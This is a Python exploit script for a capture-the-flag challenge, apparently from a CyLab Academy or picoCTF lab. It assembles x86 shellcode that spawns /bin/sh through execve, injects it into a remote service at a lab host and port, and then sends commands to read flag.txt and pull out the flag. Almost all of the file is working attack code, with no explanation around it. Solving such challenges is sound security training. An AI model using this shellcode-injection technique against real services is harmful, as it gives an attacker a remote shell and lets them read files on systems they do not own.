import sys, re, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
host, port = "xebec.cylabacademy.net", 40339
ins = ["89e7"]
for ch in "//bin/sh":
    ins.append("b0%02x" % ord(ch))
    ins.append("aa90")
ins += ["31c0", "aa90", "89e3", "5090", "5390", "89e1", "31d2", "b00b", "cd80"]
sc = b"".join(bytes.fromhex(i) for i in ins)
print("shellcode:", len(sc))
s = socket.create_connection((host, port), timeout=15)
s.settimeout(6)
time.sleep(0.3)
try:
    s.recv(200)
except Exception:
    pass
s.sendall(sc + b"\n")
time.sleep(0.8)
s.sendall(b"cat flag.txt; ls; echo END\n")
out = b""
t0 = time.time()
while time.time() - t0 < 8:
    try:
        c = s.recv(8192)
        if not c:
            break
        out += c
        if b"END" in out:
            break
    except socket.timeout:
        break
s.close()
txt = out.decode("latin-1", "replace")
print("=== distant ===")
print(txt[:700])
m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
print("FLAG:", m.group(0) if m else None)
